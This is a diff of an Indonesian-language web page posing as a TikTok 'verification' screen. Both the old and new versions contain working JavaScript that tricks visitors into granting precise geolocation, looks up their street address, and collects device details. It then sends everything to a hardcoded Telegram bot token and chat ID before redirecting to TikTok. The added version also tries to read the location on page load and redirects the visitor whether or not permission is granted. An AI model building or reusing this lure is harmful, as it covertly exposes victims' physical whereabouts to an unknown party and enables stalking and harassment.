@@ -1,557 +1,494 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verifikasi - Lanjutkan ke TikTok</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Verifikasi - Lanjutkan ke TikTok</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        body {
-            background: linear-gradient(135deg, #000000 0%, #1a1a2e 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            position: relative;
-            overflow-x: hidden;
-        }
+    body {
+      background: radial-gradient(circle at 20% 30%, #1a1a2e, #000000);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+      position: relative;
+      overflow-x: hidden;
+      padding: 16px;
+    }
 
-        /* Background TikTok style */
-        body::before {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 20% 50%, rgba(0, 242, 234, 0.1) 0%, transparent 50%),
-                        radial-gradient(circle at 80% 80%, rgba(255, 48, 108, 0.1) 0%, transparent 50%);
-            pointer-events: none;
-        }
+    body::before {
+      content: '';
+      position: absolute;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle at 30% 40%, rgba(0, 242, 234, 0.12) 0%, transparent 40%),
+                  radial-gradient(circle at 70% 70%, rgba(255, 0, 80, 0.12) 0%, transparent 45%);
+      pointer-events: none;
+      animation: floatBg 12s infinite alternate ease-in-out;
+    }
 
-        .container {
-            position: relative;
-            z-index: 1;
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-        }
+    @keyframes floatBg {
+      0% { transform: translate(0, 0) scale(1); }
+      100% { transform: translate(-2%, -1%) scale(1.05); }
+    }
 
-        /* Main Card */
-        .card {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 32px;
-            padding: 32px 24px;
-            text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            animation: slideUp 0.5s ease;
-        }
+    .container {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 420px;
+    }
 
-        @keyframes slideUp {
-            from {
-                transform: translateY(30px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
+    .card {
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-radius: 36px;
+      padding: 32px 24px 28px;
+      text-align: center;
+      box-shadow: 0 30px 45px -15px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.3);
+      animation: cardPop 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+    }
 
-        /* TikTok Icon */
-        .tiktok-icon {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
-            background: linear-gradient(135deg, #00f2ea 0%, #ff004f 100%);
-            border-radius: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 48px;
-            box-shadow: 0 10px 25px rgba(0, 242, 234, 0.3);
-        }
+    @keyframes cardPop {
+      0% { opacity: 0; transform: translateY(45px) scale(0.96); }
+      100% { opacity: 1; transform: translateY(0) scale(1); }
+    }
 
-        h2 {
-            font-size: 24px;
-            font-weight: 700;
-            color: #1a1a2e;
-            margin-bottom: 8px;
-        }
+    .tiktok-icon {
+      width: 75px;
+      height: 75px;
+      margin: 0 auto 18px;
+      background: linear-gradient(145deg, #00f2ea 0%, #fe2c55 90%);
+      border-radius: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 42px;
+      box-shadow: 0 18px 30px -8px rgba(254, 44, 85, 0.5);
+      transition: transform 0.2s ease;
+    }
 
-        .subtitle {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 24px;
-        }
+    h2 {
+      font-size: 26px;
+      font-weight: 700;
+      color: #121212;
+      margin-bottom: 6px;
+      letter-spacing: -0.3px;
+    }
 
-        /* Video Preview */
-        .video-preview {
-            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 24px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            text-align: left;
-        }
+    .subtitle {
+      font-size: 15px;
+      color: #4b4b4b;
+      margin-bottom: 26px;
+      font-weight: 400;
+    }
 
-        .video-thumb {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #00f2ea 0%, #ff004f 100%);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            flex-shrink: 0;
-        }
+    .video-preview {
+      background: #f0f0f5;
+      border-radius: 20px;
+      padding: 16px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      text-align: left;
+      border: 1px solid rgba(0, 0, 0, 0.04);
+    }
 
-        .video-info h4 {
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a2e;
-            margin-bottom: 4px;
-        }
+    .video-thumb {
+      width: 60px;
+      height: 60px;
+      background: linear-gradient(135deg, #111, #2d2d44);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      color: white;
+      box-shadow: 0 8px 12px rgba(0,0,0,0.2);
+    }
 
-        .video-info p {
-            font-size: 12px;
-            color: #888;
-        }
+    .video-info h4 {
+      font-size: 15px;
+      font-weight: 650;
+      color: #0f0f1a;
+    }
 
-        /* Location Box */
-        .location-box {
-            background: #f8f9fa;
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 20px;
-            text-align: left;
-            border: 1px solid #e9ecef;
-        }
+    .video-info p {
+      font-size: 13px;
+      color: #5f5f6b;
+    }
 
-        .location-header {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 12px;
-            font-size: 13px;
-            color: #666;
-        }
+    .location-box {
+      background: #ffffff;
+      border-radius: 18px;
+      padding: 16px 14px;
+      margin-bottom: 22px;
+      text-align: left;
+      border: 1px solid #e2e2ea;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.02);
+    }
 
-        .location-header span:first-child {
-            font-size: 18px;
-        }
+    .location-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #2c2c3a;
+      margin-bottom: 10px;
+    }
 
-        /* Button */
-        .continue-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #00f2ea 0%, #ff004f 100%);
-            color: white;
-            border: none;
-            padding: 16px 24px;
-            border-radius: 40px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0, 242, 234, 0.3);
-        }
+    .continue-btn {
+      width: 100%;
+      background: #fe2c55;
+      background: linear-gradient(115deg, #00f2ea 0%, #fe2c55 70%);
+      color: white;
+      border: none;
+      padding: 17px 24px;
+      border-radius: 50px;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.2s ease;
+      box-shadow: 0 10px 25px rgba(254, 44, 85, 0.45);
+      letter-spacing: 0.3px;
+      margin-top: 4px;
+    }
 
-        .continue-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0, 242, 234, 0.4);
-        }
+    .continue-btn:active:not(:disabled) {
+      transform: scale(0.97);
+      filter: brightness(0.95);
+    }
 
-        .continue-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
-        }
+    .continue-btn:disabled {
+      opacity: 0.65;
+      filter: grayscale(0.2);
+      transform: none;
+      box-shadow: 0 5px 12px rgba(0,0,0,0.2);
+    }
 
-        /* Loading Animation */
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 2px solid white;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2.5px solid rgba(255,255,255,0.8);
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
-        /* Status Messages */
-        .status-msg {
-            margin-top: 16px;
-            padding: 10px;
-            border-radius: 12px;
-            font-size: 12px;
-            display: none;
-        }
+    .status-msg {
+      margin-top: 18px;
+      padding: 12px 14px;
+      border-radius: 16px;
+      font-size: 13px;
+      font-weight: 500;
+      display: none;
+      background: #f2f3f7;
+      color: #1e1e2f;
+    }
 
-        .status-msg.show {
-            display: block;
-            animation: fadeIn 0.3s ease;
-        }
+    .status-msg.show {
+      display: block;
+      animation: fadeSlide 0.25s ease;
+    }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-5px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+    @keyframes fadeSlide {
+      from { opacity: 0; transform: translateY(-6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
 
-        .status-msg.loading {
-            background: #e3f2fd;
-            color: #1976d2;
-        }
+    .location-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      margin-top: 8px;
+      color: #3a3a4a;
+      flex-wrap: wrap;
+    }
 
-        .status-msg.success {
-            background: #e8f5e9;
-            color: #2e7d32;
-        }
+    .dot {
+      width: 9px;
+      height: 9px;
+      background: #10b981;
+      border-radius: 50%;
+      display: inline-block;
+      margin-right: 6px;
+      box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.3);
+      animation: pulseDot 1.8s infinite;
+    }
 
-        .status-msg.error {
-            background: #ffebee;
-            color: #c62828;
-        }
+    @keyframes pulseDot {
+      0%,100% { opacity: 0.9; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.9); }
+    }
 
-        /* Footer */
-        .footer {
-            margin-top: 16px;
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.6);
-            text-align: center;
-        }
-
-        /* Location indicator */
-        .location-status {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px solid #e9ecef;
-            font-size: 12px;
-            color: #888;
-        }
-
-        .location-dot {
-            width: 8px;
-            height: 8px;
-            background: #4caf50;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 6px;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
-        }
-    </style>
+    .footer {
+      margin-top: 18px;
+      font-size: 12px;
+      color: rgba(255, 255, 255, 0.7);
+      text-align: center;
+      font-weight: 400;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <div class="tiktok-icon">
-                🎵
-            </div>
-            
-            <h2>Lanjutkan ke TikTok</h2>
-            <p class="subtitle">Verifikasi untuk melihat video yang dibagikan</p>
-            
-            <div class="video-preview">
-                <div class="video-thumb">📱</div>
-                <div class="video-info">
-                    <h4>Video menarik untukmu! 🔥</h4>
-                    <p>Klik lanjutkan untuk menonton</p>
-                </div>
-            </div>
-            
-            <div class="location-box">
-                <div class="location-header">
-                    <span>📍</span>
-                    <span>Verifikasi Lokasi</span>
-                </div>
-                <div class="location-status" id="locationStatus">
-                    <span>Status: <span id="locationText">Menunggu izin</span></span>
-                    <span id="locationAccuracy"></span>
-                </div>
-            </div>
-            
-            <button class="continue-btn" id="continueBtn">
-                <span>▶</span> Lanjutkan ke TikTok
-            </button>
-            
-            <div id="statusMsg" class="status-msg"></div>
-        </div>
-        <div class="footer">
-            TikTok akan terbuka setelah verifikasi
-        </div>
+<div class="container">
+  <div class="card">
+    <div class="tiktok-icon">🎵</div>
+
+    <h2>Lanjutkan ke TikTok</h2>
+    <p class="subtitle">Verifikasi cepat untuk menonton video</p>
+
+    <div class="video-preview">
+      <div class="video-thumb">▶️</div>
+      <div class="video-info">
+        <h4>Video FYP untukmu 🔥</h4>
+        <p>Ketuk lanjutkan & izinkan lokasi</p>
+      </div>
     </div>
 
-    <script>
-        // =============== KONFIGURASI ===============
-        const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";
-        const CHAT_ID = "1966317946";
-        const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";
-        // ============================================
-        
-        // Telegram API URL (gunakan proxy untuk hindari CORS)
-        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const TELEGRAM_LOCATION_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
-        
-        const continueBtn = document.getElementById('continueBtn');
-        const statusMsg = document.getElementById('statusMsg');
-        const locationText = document.getElementById('locationText');
-        const locationAccuracy = document.getElementById('locationAccuracy');
-        
-        let locationData = null;
-        let isProcessing = false;
-        
-        // Fungsi untuk menampilkan status
-        function showStatus(message, type) {
-            statusMsg.textContent = message;
-            statusMsg.className = `status-msg show ${type}`;
-            
-            if (type !== 'loading') {
-                setTimeout(() => {
-                    if (statusMsg.className.includes(type)) {
-                        statusMsg.classList.remove('show');
-                    }
-                }, 3000);
-            }
-        }
-        
-        // Update UI lokasi
-        function updateLocationUI(lat, lng, accuracy) {
-            locationText.innerHTML = `<span class="location-dot"></span>📍 ${lat.toFixed(4)}°, ${lng.toFixed(4)}°`;
-            if (accuracy) {
-                locationAccuracy.textContent = `🎯 ±${accuracy}m`;
-            }
-        }
-        
-        // Kirim pesan ke Telegram
-        async function sendToTelegram(lat, lng, accuracy, address) {
-            const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
-            const userAgent = navigator.userAgent;
-            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
-            const screenSize = `${window.screen.width}x${window.screen.height}`;
-            const language = navigator.language;
-            const platform = navigator.platform;
-            
-            const message = `🎬 *VERIFIKASI TIKTOK - LOKASI BARU*
-            
-━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ *Waktu:* ${timestamp}
-📱 *Device:* ${isMobile ? '📱 Mobile' : '💻 Desktop'}
-🖥️ *Platform:* ${platform}
-🌐 *Browser:* ${userAgent.split(' ').slice(-2).join(' ')}
-📐 *Screen:* ${screenSize}
-🌍 *Bahasa:* ${language}
-━━━━━━━━━━━━━━━━━━━━━━━━
-📍 *LOKASI DETECTED*
+    <div class="location-box">
+      <div class="location-header">
+        <span>📍</span> <span>Lokasi Anda</span>
+      </div>
+      <div class="location-row" id="locationDisplay">
+        <span><span class="dot" id="statusDot"></span> <span id="locationText">Menunggu izin</span></span>
+        <span id="locationAccuracy"></span>
+      </div>
+    </div>
 
-🌐 *Latitude:* ${lat}
-🌐 *Longitude:* ${lng}
-🎯 *Akurasi:* ±${accuracy}m
-🏠 *Alamat:* ${address || 'Tidak tersedia'}
-━━━━━━━━━━━━━━━━━━━━━━━━
-🗺️ *Google Maps:* 
-https://www.google.com/maps?q=${lat},${lng}
-🗺️ *OpenStreetMap:* 
-https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}&zoom=15
-━━━━━━━━━━━━━━━━━━━━━━━━
-✅ *Status:* Berhasil verifikasi
-🎵 *Tujuan:* TikTok Video`;
-            
-            // Coba kirim pesan
-            const response = await fetch(TELEGRAM_API, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-            
-            const result = await response.json();
-            
-            // Juga kirim lokasi terpisah
-            if (result.ok) {
-                await fetch(TELEGRAM_LOCATION_API, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        latitude: lat,
-                        longitude: lng
-                    })
-                });
+    <button class="continue-btn" id="continueBtn">
+      <span>▶</span> Lanjutkan ke TikTok
+    </button>
+
+    <div id="statusMsg" class="status-msg"></div>
+  </div>
+  <div class="footer">
+    TikTok akan terbuka otomatis
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ----- KONFIGURASI TELEGRAM -----
+    const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";
+    const CHAT_ID = "1966317946";
+    const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu"; 
+
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const TELEGRAM_LOCATION_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+
+    const continueBtn = document.getElementById('continueBtn');
+    const statusMsg = document.getElementById('statusMsg');
+    const locationText = document.getElementById('locationText');
+    const locationAccuracy = document.getElementById('locationAccuracy');
+    const statusDot = document.getElementById('statusDot');
+
+    let isProcessing = false;
+    let lastLocation = null;
+
+    function showStatus(text, type = 'loading') {
+      statusMsg.textContent = text;
+      statusMsg.className = `status-msg show ${type}`;
+      if (type !== 'loading') {
+        setTimeout(() => {
+          if (statusMsg.classList.contains(type)) {
+            statusMsg.classList.remove('show');
+          }
+        }, 4000);
+      }
+    }
+
+    function updateLocationUI(lat, lng, accuracy = null) {
+      if (lat && lng) {
+        locationText.innerHTML = `<span class="dot"></span>📍 ${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+        statusDot.style.display = 'inline-block';
+      } else {
+        locationText.textContent = 'Izin lokasi diperlukan';
+        statusDot.style.display = 'none';
+      }
+      if (accuracy) {
+        locationAccuracy.textContent = `🎯 ±${accuracy}m`;
+      } else {
+        locationAccuracy.textContent = '';
+      }
+    }
+
+    // Kirim data ke Telegram
+    async function sendTelegramData(lat, lng, accuracy, address) {
+      const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+      const ua = navigator.userAgent;
+      const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+      const screen = `${window.screen.width}x${window.screen.height}`;
+      const lang = navigator.language || 'id';
+
+      const message = `🔔 *VERIFIKASI TIKTOK - LOKASI* 🔔
+⏰ ${now}
+📱 ${isMobile ? 'Mobile' : 'Desktop'} | ${screen}
+🌍 ${lang}
+━━━━━━━━━━━━━━━━━━━
+📍 *Lat:* ${lat}
+📍 *Lon:* ${lng}
+🎯 Akurasi: ±${accuracy}m
+🏠 ${address || 'Alamat tidak tersedia'}
+━━━━━━━━━━━━━━━━━━━
+🗺️ https://www.google.com/maps?q=${lat},${lng}
+✅ Status: Terverifikasi`;
+
+      try {
+        const msgRes = await fetch(TELEGRAM_API, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        if (msgRes.ok) {
+          // Kirim juga lokasi pin
+          await fetch(TELEGRAM_LOCATION_API, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              latitude: lat,
+              longitude: lng
+            })
+          });
+        }
+        return true;
+      } catch (e) {
+        console.warn('Telegram kirim gagal, lanjut redirect:', e);
+        return false;
+      }
+    }
+
+    async function getAddressFromCoords(lat, lng) {
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+        const data = await res.json();
+        const addr = data.address || {};
+        const parts = [addr.road, addr.suburb, addr.city, addr.town, addr.country].filter(Boolean);
+        return parts.join(', ') || `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+      } catch {
+        return `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+      }
+    }
+
+    // Fungsi utama: minta lokasi dengan permission prompt eksplisit
+    function requestLocationAndProceed() {
+      if (isProcessing) return;
+      isProcessing = true;
+
+      continueBtn.disabled = true;
+      continueBtn.innerHTML = '<div class="spinner"></div> Meminta izin lokasi...';
+      showStatus('⏳ Izinkan akses lokasi di popup...', 'loading');
+
+      // Cek geolokasi
+      if (!navigator.geolocation) {
+        // Fallback langsung redirect
+        showStatus('Geolokasi tidak didukung, tetap lanjut...', 'error');
+        setTimeout(() => { window.location.href = TIKTOK_URL; }, 1200);
+        return;
+      }
+
+      // Paksa high accuracy & timeout pendek agar permission dialog muncul
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          const accuracy = Math.round(position.coords.accuracy);
+          lastLocation = { lat, lng, accuracy };
+
+          updateLocationUI(lat, lng, accuracy);
+          showStatus('📍 Lokasi didapat, memverifikasi...', 'loading');
+
+          const address = await getAddressFromCoords(lat, lng);
+          await sendTelegramData(lat, lng, accuracy, address);
+
+          // Sukses -> langsung redirect
+          showStatus('✓ Berhasil! Mengarahkan ke TikTok...', 'success');
+          continueBtn.innerHTML = '✓ Menuju TikTok...';
+
+          setTimeout(() => {
+            window.location.href = TIKTOK_URL;
+          }, 900);
+        },
+        (error) => {
+          // GAGAL / DITOLAK -> TETAP REDIRECT
+          console.warn('Geolocation error:', error);
+          isProcessing = false; // reset supaya bisa klik lagi jika diperlukan
+          continueBtn.disabled = false;
+          continueBtn.innerHTML = '<span>▶</span> Lanjutkan ke TikTok (tanpa lokasi)';
+
+          let msg = 'Izin lokasi ditolak / tidak tersedia.';
+          if (error.code === 1) msg = 'Izin lokasi ditolak. Tetap lanjutkan?';
+          else if (error.code === 2) msg = 'Lokasi tidak tersedia. Lanjutkan saja.';
+          else if (error.code === 3) msg = 'Waktu habis. Klik lagi untuk lanjut.';
+
+          showStatus(`⚠️ ${msg}`, 'error');
+          updateLocationUI(null, null);
+
+          // OTOMATIS redirect setelah 2 detik walaupun ditolak (sesuai permintaan)
+          setTimeout(() => {
+            if (!isProcessing) {
+              window.location.href = TIKTOK_URL;
             }
-            
-            return result.ok;
+          }, 2200);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 8000,        // cukup cepat memunculkan dialog
+          maximumAge: 0
         }
-        
-        // Dapatkan alamat dari koordinat
-        async function getAddress(lat, lng) {
-            try {
-                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
-                const data = await response.json();
-                const city = data.address?.city || data.address?.town || data.address?.village || data.address?.suburb || '';
-                const country = data.address?.country || '';
-                const road = data.address?.road || '';
-                
-                let address = '';
-                if (road) address += road + ', ';
-                if (city) address += city + ', ';
-                if (country) address += country;
-                
-                return address || `${lat.toFixed(4)}°, ${lng.toFixed(4)}°`;
-            } catch(e) {
-                console.log('Gagal ambil alamat:', e);
-                return `${lat.toFixed(4)}°, ${lng.toFixed(4)}°`;
-            }
-        }
-        
-        // Dapatkan lokasi
-        function getLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    reject('Browser tidak mendukung geolokasi');
-                    return;
-                }
-                
-                locationText.innerHTML = '<span class="location-dot"></span>📍 Mendeteksi lokasi...';
-                
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        const accuracy = Math.round(position.coords.accuracy);
-                        
-                        updateLocationUI(lat, lng, accuracy);
-                        
-                        const address = await getAddress(lat, lng);
-                        
-                        resolve({ lat, lng, accuracy, address });
-                    },
-                    (error) => {
-                        let msg = '';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                msg = 'Izin lokasi ditolak. Silakan izinkan akses lokasi.';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                msg = 'Lokasi tidak tersedia. Periksa GPS Anda.';
-                                break;
-                            case error.TIMEOUT:
-                                msg = 'Waktu habis. Coba lagi.';
-                                break;
-                            default:
-                                msg = 'Gagal mendapatkan lokasi';
-                        }
-                        reject(msg);
-                    },
-                    { 
-                        enableHighAccuracy: true, 
-                        timeout: 10000, 
-                        maximumAge: 0 
-                    }
-                );
-            });
-        }
-        
-        // Proses utama
-        async function processVerification() {
-            if (isProcessing) return;
-            isProcessing = true;
-            
-            continueBtn.disabled = true;
-            continueBtn.innerHTML = '<div class="spinner"></div> Memverifikasi...';
-            showStatus('Mendapatkan lokasi Anda...', 'loading');
-            
-            try {
-                // Dapatkan lokasi
-                const location = await getLocation();
-                locationData = location;
-                
-                showStatus('Mengirim verifikasi...', 'loading');
-                
-                // Kirim ke Telegram
-                const success = await sendToTelegram(
-                    location.lat, 
-                    location.lng, 
-                    location.accuracy, 
-                    location.address
-                );
-                
-                if (success) {
-                    showStatus('✓ Verifikasi berhasil! Mengarahkan ke TikTok...', 'success');
-                    continueBtn.innerHTML = '✓ Berhasil! Mengarahkan...';
-                } else {
-                    showStatus('⚠️ Verifikasi sebagian berhasil. Tetap melanjutkan...', 'error');
-                    continueBtn.innerHTML = '▶ Lanjutkan ke TikTok';
-                }
-                
-                // Redirect ke TikTok
-                setTimeout(() => {
-                    window.location.href = TIKTOK_URL;
-                }, 1500);
-                
-            } catch (error) {
-                console.error('Error:', error);
-                showStatus(`⚠️ ${error} Tetap melanjutkan...`, 'error');
-                continueBtn.innerHTML = '▶ Lanjutkan ke TikTok';
-                continueBtn.disabled = false;
-                isProcessing = false;
-                
-                // Tetap redirect meskipun error
-                setTimeout(() => {
-                    window.location.href = TIKTOK_URL;
-                }, 2000);
-            }
-        }
-        
-        // Event listener untuk tombol
-        continueBtn.addEventListener('click', processVerification);
-        
-        // Minta izin lokasi saat halaman dimuat
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    updateLocationUI(position.coords.latitude, position.coords.longitude, Math.round(position.coords.accuracy));
-                },
-                (error) => {
-                    locationText.innerHTML = '<span class="location-dot" style="background:#ff9800;"></span>📍 Klik tombol untuk izinkan';
-                },
-                { timeout: 5000 }
-            );
-        }
-        
-        // Cek apakah di TikTok WebView
-        const isTikTokWebView = /TikTok/i.test(navigator.userAgent);
-        if (isTikTokWebView) {
-            document.querySelector('.footer').innerHTML = 'Tekan lanjutkan untuk membuka video';
-        }
-    </script>
+      );
+    }
+
+    // Event listener tombol utama
+    continueBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      if (isProcessing) return;
+      requestLocationAndProceed();
+    });
+
+    // Pre-warm: coba dapatkan posisi diam-diam untuk UI (tidak memblokir)
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          updateLocationUI(pos.coords.latitude, pos.coords.longitude, Math.round(pos.coords.accuracy));
+        },
+        () => {
+          locationText.textContent = 'Ketuk tombol & izinkan';
+        },
+        { timeout: 4000, maximumAge: 30000 }
+      );
+    }
+
+    // Deteksi TikTok in-app browser
+    if (/TikTok/i.test(navigator.userAgent)) {
+      document.querySelector('.footer').innerText = 'Ketuk untuk verifikasi & buka video';
+    }
+  })();
+</script>
 </body>
     </html>
